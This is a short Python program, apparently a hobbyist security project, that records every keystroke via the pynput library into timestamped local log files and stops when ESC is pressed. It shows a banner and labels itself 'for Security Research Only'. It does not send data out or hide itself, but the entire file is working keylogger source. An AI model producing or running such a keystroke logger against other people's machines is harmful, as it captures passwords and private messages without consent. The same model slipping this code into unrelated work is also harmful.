import os
import logging
from datetime import datetime
from pynput import keyboard

# ===== Configuration =====
AUTHOR = "Yuva Prasath"
LOG_DIR = "keylogger_logs"
SESSION = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_FILE = os.path.join(LOG_DIR, f"session_{SESSION}.log")

# ===== Prepare Logging =====
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# ===== Session Header =====
logging.info("======================================================")
logging.info(f"Keylogger Session Started: {SESSION}")
logging.info(f"Tool developed by {AUTHOR} | For Security Research Only")
logging.info("======================================================\n")

# ===== Keystroke Functions =====
def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        logging.info("\n[+] ESC key detected. Ending session...\n")
        logging.info("=" * 55)
        print("\n[✔] ESC pressed – Logging session ended.")
        print("[✔] Log saved to:", LOG_FILE)
        return False  # Stop listener

# ===== Display Banner =====
def print_banner():
    print("\n" + "="*60)
    print(" 🔐 Keylogger for Security Research")
    print(" 👨‍💻 Developed by Yuva Prasath")
    print(" 📁 Logging File:", LOG_FILE)
    print(" 🚨 Press ESC to stop logging")
    print("="*60 + "\n")

# ===== Main =====
def main():
    try:
        print_banner()
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[✋] Ctrl+C detected – Logging interrupted manually.")
        logging.info("\n[!] Logging manually interrupted with Ctrl+C\n")
        logging.info("=" * 55)
        print("[✔] Log saved to:", LOG_FILE)
    except Exception as e:
        print(f"[!] Error occurred: {e}")
        logging.error(f"[!] Exception occurred: {e}")

if __name__ == "__main__":
    main()
